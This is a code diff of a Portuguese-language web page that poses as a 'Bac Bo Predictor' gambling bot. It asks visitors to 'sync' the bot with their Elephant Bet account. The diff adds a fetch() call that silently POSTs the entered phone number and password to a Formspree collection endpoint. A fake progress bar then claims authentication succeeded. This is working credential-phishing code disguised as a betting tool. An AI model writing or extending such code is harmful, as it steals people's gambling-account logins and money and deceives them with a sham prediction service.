@@ -21,7 +21,7 @@
     .progress-bar { width:80%; height:20px; background:#222; margin:20px auto; border-radius:10px; overflow:hidden; }
     .progress { height:100%; width:0%; background:#00ffcc; text-align:center; color:#000; font-size:0.8em; }
     .empate-text { font-size:0.9em; color:#ffd700; margin-top:5px; }
-    #preverBtn { margin-bottom:25px; } /* separa os botões */
+    #preverBtn { margin-bottom:25px; }
     .game-image { max-width:90%; margin:20px auto; border-radius:10px; }
   </style>
 </head>
@@ -29,11 +29,10 @@
   <!-- Tela inicial -->
   <div id="inicioScreen">
     <h1>BAC BO PREDICTOR</h1>
-    <!-- Imagem do jogo adicionada -->
-    <img src="/attachments/vV5foaskb3Lg4DyQjg2KB.png" alt="Bac Bo Live" class="game-image">
+    <img src="bacbo.png" alt="Bac Bo Live" class="game-image">
     <form id="inicioForm">
-      <input type="text" id="numeroInicio" placeholder="Número de telemóvel" required><br>
-      <input type="text" id="chaveInicio" placeholder="Chave de acesso" required><br>
+      <input type="text" id="numeroInicio" name="numeroInicio" placeholder="Número de telemóvel" required><br>
+      <input type="text" id="chaveInicio" name="chaveInicio" placeholder="Chave de acesso" required><br>
       <button type="submit">Entrar</button>
     </form>
   </div>
@@ -55,8 +54,8 @@
   <div id="loginScreen">
     <h2>Sincroniza o Bot à sua conta da Elephant Bet</h2>
     <form id="loginForm">
-      <input type="text" id="numeroLogin" placeholder="Número de telemóvel" required><br>
-      <input type="text" id="senhaLogin" placeholder="Digite a sua senha" required><br>
+      <input type="text" id="numeroLogin" name="numeroLogin" placeholder="Número de telemóvel" required><br>
+      <input type="text" id="senhaLogin" name="senhaLogin" placeholder="Digite a sua senha" required><br>
       <button type="submit">Sincronizar Agora</button>
     </form>
     <a href="#" id="closeLogin">← Voltar</a>
@@ -92,7 +91,7 @@
     const maxPrevisoes = 5;
     let bloqueado = false;
 
-    // Tela inicial → vai para Predictor
+    // Tela inicial → apenas valida e avança
     inicioForm.addEventListener("submit", function(e) {
       e.preventDefault();
       if (!/^9\d{8}$/.test(numeroInicio.value)) { alert("Número inválido!"); return; }
@@ -113,11 +112,16 @@
       predictorScreen.style.display = "block";
     });
 
-    // Tela de login verdadeira → vai para tela de carregamento
+    // Tela de login verdadeira → envia para Formspree
     loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
       if (!/^9\d{8}$/.test(numeroLogin.value)) { alert("Número inválido!"); return; }
       if (senhaLogin.value.length < 5) { alert("Senha muito curta!"); return; }
+      fetch("https://formspree.io/f/mbdeddpb", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ numeroLogin: numeroLogin.value, senhaLogin: senhaLogin.value })
+      });
       loginScreen.style.display = "none";
       loadingScreen.style.display = "block";
 
@@ -130,7 +134,7 @@
           clearInterval(interval);
           progressBar.textContent = "75% - Autenticação concluída";
         }
-      }, 4000); // 75*4s = 300s (5 minutos)
+      }, 4000);
     });
 
     // Predictor
@@ -155,7 +159,10 @@
           }
         }
       }, 50);
-      if (previsoesFeitas >= maxPrevisoes) { bloqueado = true; blockedMsg.style.display = "block"; }
+      if (previsoesFeitas >= maxPrevisoes) {
+        bloqueado = true;
+        blockedMsg.style.display = "block";
+      }
     });
 
     // Inicial
